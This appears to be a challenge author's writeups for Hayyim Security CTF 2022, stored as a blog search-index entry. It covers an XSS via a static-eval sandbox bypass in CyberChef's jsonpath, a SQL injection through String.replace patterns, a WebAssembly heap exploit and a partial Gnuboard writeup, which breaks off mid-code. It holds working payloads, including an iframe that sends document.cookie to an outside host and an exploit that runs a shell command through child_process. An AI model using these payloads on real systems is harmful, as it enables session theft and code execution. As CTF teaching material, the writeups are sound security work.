<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Writeups for Hayyim Security CTF 2022</title>
      <link href="/writeups-for-hayyim-security-ctf-2022/"/>
      <url>/writeups-for-hayyim-security-ctf-2022/</url>
      
        <content type="html"><![CDATA[<h2 id="Cyberchef-Cyber-Headchef"><a href="#Cyberchef-Cyber-Headchef" class="headerlink" title="Cyberchef, Cyber Headchef"></a>Cyberchef, Cyber Headchef</h2><ul><li>Difficulty: <strong>★★★★★</strong></li><li>Solved: <strong>57 &#x2F; 541</strong>, <strong>22 &#x2F; 541</strong></li><li>Tag: <strong>XSS</strong>, <strong>Javascript</strong></li></ul><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p><code>Cyberchef</code> was the most solved challenge this overall CTF even though I thought this will be the hardest one in this CTF.<br>The reason was an unintended solution what I didn’t caughted from <a href="https://github.com/gchq/CyberChef/issues/1265">this github issue</a>.<br>So I published another challenged Cyber Headchef with prohibiting use of string “table” in the payload.</p><p>But my mitigation was not enough to prevent the unintended solution.<br>It worked again with a null byte insertion in the middle of the <code>table</code> string.<br>Since you can check the unintended XSS payload in the link above, That will not be discussed in here.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/#recipe=JPath_expression(&#x27;0&#x27;,&#x27;\n&#x27;)&amp;input=WzEzMzdd</span><br><span class="line">result : 1337</span><br></pre></td></tr></table></figure><p>Among the many of cyberchef functionalities<br>you can see there’s <code>JPath_expression</code> which does jsonpath query with given json string.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">evaluate</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123; <span class="keyword">return</span> _evaluate.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>) &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="string">&#x27;subscript-child-filter_expression&#x27;</span>: <span class="keyword">function</span>(<span class="params">component, partial, count</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// slice out the expression from ?(expression)</span></span><br><span class="line">    <span class="keyword">var</span> src = component.<span class="property">expression</span>.<span class="property">value</span>.<span class="title function_">slice</span>(<span class="number">2</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> ast = aesprim.<span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> passable = <span class="keyword">function</span>(<span class="params">key, value</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> evaluate(ast, &#123; <span class="string">&#x27;@&#x27;</span>: value &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">descend</span>(partial, <span class="literal">null</span>, passable, count);</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;subscript-descendant-filter_expression&#x27;</span>: <span class="keyword">function</span>(<span class="params">component, partial, count</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// slice out the expression from ?(expression)</span></span><br><span class="line">    <span class="keyword">var</span> src = component.<span class="property">expression</span>.<span class="property">value</span>.<span class="title function_">slice</span>(<span class="number">2</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> ast = aesprim.<span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> passable = <span class="keyword">function</span>(<span class="params">key, value</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> evaluate(ast, &#123; <span class="string">&#x27;@&#x27;</span>: value &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">traverse</span>(partial, <span class="literal">null</span>, passable, count);</span><br><span class="line">  &#125;,</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>The <a href="https://npmjs.com/package/jsonpath">jsonpath</a> module tries to evaluate the given script includes subscript expression with <code>static-eval</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;MemberExpression&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="title function_">walk</span>(node.<span class="property">object</span>);</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === <span class="variable constant_">FAIL</span>) || (<span class="keyword">typeof</span> obj == <span class="string">&#x27;function&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">property</span>.<span class="property">type</span> === <span class="string">&#x27;Identifier&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[node.<span class="property">property</span>.<span class="property">name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> prop = <span class="title function_">walk</span>(node.<span class="property">property</span>);</span><br><span class="line">    <span class="keyword">if</span> (prop === <span class="variable constant_">FAIL</span>) <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    <span class="keyword">return</span> obj[prop];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>static-eval</code> tries to evaluate ast statement parsed by asprima.<br>They have restricted implementation for the expressions.<br>But there are MemberExpression, CallExpression, FunctionExpression and It’s pretty enough to mess up everything.</p><p>More than everything else, their implementaion for the MemberExpression has a obvious flaw.<br>The fourth line in the above snippet seems like to prevent from referencing constructor of javascript function.<br>But this can be easily bypassed with the statement below.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">__proto__</span>:[].<span class="property">constructor</span>&#125;;</span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">typeof</span> obj</span><br><span class="line"><span class="comment">// &#x27;object&#x27;</span></span><br><span class="line">obj.<span class="property">constructor</span></span><br><span class="line"><span class="comment">// ƒ Function() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure><p>The object has a function in their <code>__proto__</code> attribute returns constructor of function when their constructor referenced even though its operated value with typeof operator returns <code>object</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;__proto__:[].constructor&#125;).constructor(&#x27;console.log(1337)&#x27;)()`</span>;</span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"> </span><br><span class="line">evaluate(ast); <span class="comment">// This prints &quot;1337&quot;</span></span><br></pre></td></tr></table></figure><p>So this can be used to bypass restriction of static-eval.<br>And It leads to XSS vulnerability in Cyberchef application.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/#recipe=JPath_expression(&#x27;$..%5B?((%7B__proto__:%5B%5D.constructor%7D).constructor(%22self.postMessage(%7Baction:%5C&#x27;bakeComplete%5C&#x27;,data:%7BbakeId:1,dish:%7Btype:1,value:%5C&#x27;%5C&#x27;%7D,duration:1,error:false,id:undefined,inputNum:2,progress:1,result:%5C&#x27;%3Ciframe/onload%3Dalert(1337)%3E%5C&#x27;,type:%20%5C&#x27;html%5C&#x27;%7D%7D);%22)();)%5D&#x27;,&#x27;%5C%5Cn&#x27;)&amp;input=W3t9XQ</span><br></pre></td></tr></table></figure><p>This is the payload. It gives the custom script to be evaluated to static-eval thought jsonpath.<br>and finally you can see It pops up <code>1337</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;http://cyberchef:8000/#recipe=JPath_expression(&#x27;$..%5B?((%7B__proto__:%5B%5D.constructor%7D).constructor(%22self.postMessage(%7Baction:%5C&#x27;bakeComplete%5C&#x27;,data:%7BbakeId:1,dish:%7Btype:1,value:%5C&#x27;%5C&#x27;%7D,duration:1,error:false,id:undefined,inputNum:2,progress:1,result:%5C&#x27;%3Ciframe/onload%3Dfetch(`http://p6.is/flag?$&#123;document.cookie&#125;`)%3E%5C&#x27;,type:%20%5C&#x27;html%5C&#x27;%7D%7D);%22)();)%5D&#x27;,&#x27;%5C%5Cn&#x27;)&amp;input=W3t9XQ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://1.230.253.91:8001/report&#x27;</span>, data = &#123;</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: payload</span><br><span class="line">&#125;, allow_redirects = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>You could get the flag with this payload in the request from the selenium bot.</p><h2 id="Not-E"><a href="#Not-E" class="headerlink" title="Not E"></a>Not E</h2><ul><li>Difficulty: <strong>★</strong></li><li>Solved: <strong>38 &#x2F; 541</strong></li><li>Tag: <strong>Javascript</strong>, <strong>SQLi</strong></li></ul><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>Intended solution was using special replacement pattern of String.prototype.replace</p><table><thead><tr><th>Pattern</th><th>Inserts</th></tr></thead><tbody><tr><td>$$</td><td>Inserts a “$”.</td></tr><tr><td>$&amp;</td><td>Inserts the matched substring.</td></tr><tr><td>$&#96;</td><td>Inserts the portion of the string that precedes the matched substring.</td></tr><tr><td>$’</td><td>Inserts the portion of the string that follows the matched substring.</td></tr></tbody></table><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#<span class="title function_">formatQuery</span>(<span class="params">sql, params = []</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> param <span class="keyword">of</span> params) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> param === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&#x27;?&#x27;</span>, param);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> param === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(param.<span class="title function_">replace</span>(<span class="regexp">/[&quot;\\]/g</span>, <span class="string">&#x27;&#x27;</span>)));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="string">&quot;&quot;</span>); <span class="comment">// unreachable</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sql;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In the given source, Database class extends sqlite db has private method which does the role of query builder.<br>It builds the query with params from the array after stripping the double quotes and backslash from the array elements.<br>SInce JSON.stringify wraps the result string with double quotes, the replacing prevents sql injection from the param.</p><p>But you still make injection in here by inserting special replacement pattern <code>$&#39;</code> to the title of note. The steps are as follows.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># querystring</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (?, ?, ?, ?)</span><br><span class="line"># noteId : &quot;60b725&quot;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (&quot;60b725&quot;, ?, ?, ?)</span><br><span class="line"># title : &quot;$&#x27;&quot;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (&quot;60b725&quot;, &quot;, ?, ?)&quot;, ?, ?)</span><br><span class="line"># content : &quot;, (select flag from flag), char(97))-- -&quot;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (&quot;60b725&quot;, &quot;, &quot;, (<span class="keyword">select</span> flag <span class="keyword">from</span> flag), <span class="type">char</span>(<span class="number">117</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">115</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">101</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">114</span>))<span class="comment">-- -&quot;, ?)&quot;, ?, ?)</span></span><br><span class="line"># username : &quot;user&quot;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (&quot;60b725&quot;, &quot;, &quot;, (<span class="keyword">select</span> flag <span class="keyword">from</span> flag), <span class="type">char</span>(<span class="number">117</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">115</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">101</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">114</span>))<span class="comment">-- -&quot;, &quot;user&quot;)&quot;, ?, ?)</span></span><br></pre></td></tr></table></figure><p>This query inserts the content of flag into the new note of the user named <code>user</code>.<br>So, you can check the flag from the note list.</p><h2 id="Wasmup"><a href="#Wasmup" class="headerlink" title="Wasmup"></a>Wasmup</h2><ul><li>Difficulty: <strong>★★</strong></li><li>Solved: <strong>4 &#x2F; 541</strong></li><li>Tag: <strong>WebAssembly</strong></li></ul><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>This challenge was inspired by <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf">this reference</a> presented in Defcon 2018 by NCCGroup.<br>In contrast to wasm is the popular topic from modern browsers.<br>It seems there are not many web challenges dealing wasm excepting the reversing aspects.<br>So I thought one challenge dealing wasm can be informative for all.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="built_in">printMenu</span>();</span><br><span class="line">    <span class="type">int</span> choice = <span class="built_in">readInt</span>(<span class="string">&quot;choice&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">createNote</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">editNote</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">deleteNote</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">emscripten_run_script</span>(<span class="string">&quot;process.exit(0);&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Its implementation is almost same with other basic heap challenges except that one part that exits the program.<br>When the user sends number <code>4</code> as input, it runs <code>emscripten_run_script</code> function with the string <code>process.exit(0);</code> which is actually javascript code to exit process.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_emscripten_run_script</span>(<span class="params">ptr</span>) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="title class_">UTF8ToString</span>(str));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> asmLibraryArg = &#123;</span><br><span class="line">  <span class="string">&quot;emscripten_memcpy_big&quot;</span>: _emscripten_memcpy_big,</span><br><span class="line">  <span class="string">&quot;emscripten_resize_heap&quot;</span>: _emscripten_resize_heap,</span><br><span class="line">  <span class="string">&quot;emscripten_run_script&quot;</span>: _emscripten_run_script,</span><br><span class="line">  <span class="string">&quot;fd_close&quot;</span>: _fd_close,</span><br><span class="line">  <span class="string">&quot;fd_read&quot;</span>: _fd_read,</span><br><span class="line">  <span class="string">&quot;fd_seek&quot;</span>: _fd_seek,</span><br><span class="line">  <span class="string">&quot;fd_write&quot;</span>: _fd_write,</span><br><span class="line">  <span class="string">&quot;setTempRet0&quot;</span>: _setTempRet0</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The function <code>emscripten_run_script</code> just evaluate the string given as a parameter.<br>So you can execute any script If you overwrite the string <code>process.exit(0);</code> which is in somewhere of wasm memory.<br>In normal binaries complied with generic compiler like clang, gcc, It’s impossible to change these data because its section declared to read-only area. but In the case of wasm, the section is also writable since they does not distinguish bss&#x2F;ro&#x2F;rw sections.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;1.230.253.91&#x27;</span>, <span class="string">&#x27;2000&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0x69</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x81</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0xc</span> + p32(<span class="number">0x69</span>) + p32(<span class="number">0x898</span> - <span class="number">0x10</span>) + p32(<span class="number">0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">2</span>, p32(<span class="number">0x483</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5c</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;console.log(require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;)+[]);process.exit(0);\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>So, above is the actual exploit for <code>Wasmup</code>.</p><p>createNote function has a flaw that changes the size of the specific note even though the invalid size has given.<br>By that flaw, you can overwrite note[0] to the address of <code>process.exit(0);</code></p><p>It prints flag by calling <code>emscripten_run_script</code> after manipulating data.</p><h2 id="Gnuboard"><a href="#Gnuboard" class="headerlink" title="Gnuboard"></a>Gnuboard</h2><ul><li>Difficulty: <strong>★★★</strong></li><li>Solved: <strong>4 &#x2F; 541</strong></li><li>Tag: <strong>PHP</strong></li></ul><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>Gnuboard is one of most popular cms in SK used for non-commerial projects.<br>Few years ago, I used to report vuln of gnuboard but It seems how they adds new feature meh.<br>Inspired by many of their bugs, I decided to make a challenge from it.</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y wget curl apache2 git php-gd php-mysql php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/gnuboard/gnuboard5 /tmp/gnuboard</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -r /tmp/gnuboard/* /var/www/html</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/AllowOverride None/AllowOverride All/g&#x27;</span> /etc/apache2/apache2.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 777 data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf index.html /tmp/gnuboard</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;$flag = &quot;hsctf&#123;flag-will-be-here&#125;&quot;;&#x27;</span> &gt;&gt; /var/www/html/common.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> entrypoint.sh /</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /entrypoint.sh</span></span><br></pre></td></tr></table></figure><p>You can see it saves the flag at common.php as a variable in the given dockerfile.<br>So It requires you to find vulnerability can print specific variable or execute command or prints the content of common.php. the intended solution was the first.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$netcancelResultString</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 망취소 요청 API url(고정, 임의 세팅 금지)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$httpUtil</span>-&gt;<span class="title function_ invoke__">processHTTP</span>(<span class="variable">$netCancel</span>, <span 